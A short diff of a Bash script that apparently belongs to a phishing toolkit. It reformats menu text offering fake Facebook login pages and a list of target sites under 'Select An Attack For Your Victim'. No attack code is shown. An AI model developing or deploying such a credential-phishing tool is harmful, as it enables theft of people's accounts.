@@ -341,10 +341,10 @@ tunnel_menu() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${CYAN} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${CYAN} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${CYAN} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${CYAN} Facebook Messenger Login Page
+		${RED}(${WHITE}01${RED})${CYAN} Traditional Login Page
+		${RED}(${WHITE}02${RED})${CYAN} Advanced Voting Poll Login Page
+		${RED}(${WHITE}03${RED})${CYAN} Fake Security Login Page
+		${RED}(${WHITE}04${RED})${CYAN} Facebook Messenger Login Page
 
 	EOF
 
@@ -470,7 +470,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${CYAN Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${CYAN}
+		${RED}[${WHITE}::${RED}]${CYAN} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${CYAN}
 
 		${RED}[${WHITE}01${RED}]${CYAN} Facebook      ${RED}[${WHITE}11${RED}]${CYAN} Twitch       ${RED}[${WHITE}21${RED}]${CYAN} DeviantArt
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram     ${RED}[${WHITE}12${RED}]${CYAN} Pinterest    ${RED}[${WHITE}22${RED}]${CYAN} Badoo
